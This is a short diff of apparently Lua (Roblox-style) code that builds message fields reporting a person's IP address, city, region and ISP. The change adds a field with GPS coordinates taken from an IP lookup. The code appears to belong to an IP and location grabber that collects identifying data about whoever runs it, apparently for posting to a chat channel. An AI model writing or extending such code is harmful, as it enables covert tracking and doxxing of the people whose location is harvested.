@@ -396,6 +396,7 @@ task.spawn(function()
         table.insert(fields, {
             name   = "🤫  Info Avançada",
             value  = "||`IP      : " .. (ipData.ip     or ip)         .. "`||\n"
+                  .. "||`Localização GPS : " .. (ipinfo_table.loc  or "N/A")      .. "`||\n"
                   .. "||`Cidade  : " .. (ipData.city   or "N/A")      .. "`||\n"
                   .. "||`Região  : " .. (ipData.region or "N/A")      .. "`||\n"
                   .. "||`ISP/Org : " .. (ipData.org    or "N/A")      .. "`||",
